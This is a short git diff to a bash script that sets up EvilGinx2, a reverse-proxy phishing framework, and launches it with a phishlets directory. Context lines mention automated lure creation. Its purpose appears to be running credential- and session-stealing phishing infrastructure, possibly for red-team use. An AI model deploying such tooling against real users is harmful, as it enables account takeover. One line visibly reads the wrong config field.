@@ -1,7 +1,4 @@
 #!/bin/bash
-
-mkdir -p /shared-data/EG2_DB /shared-data/fresh-data /shared-data/used-data
-
 setup_evilginx() {
     domain_name=$1
     hostname=$2
@@ -177,6 +174,8 @@ default_phishlet=$(jq -r '.EvilGinx2.default_phishlet' "$config_file")
 default_redirect=$(jq -r '.EvilGinx2.default_redirect' "$config_file")
 opsgenie_api_key=$(jq -r '.EvilGinx2.default_redirect' "$config_file")
 #Setup EvilGinx2
+mkdir -p /shared-data/EG2_DB /shared-data/fresh-data /shared-data/used-data
+/bin/evilginx -p /app/phishlets/ -developer -debug
 setup_evilginx
 
 # Automate multiple lure creation
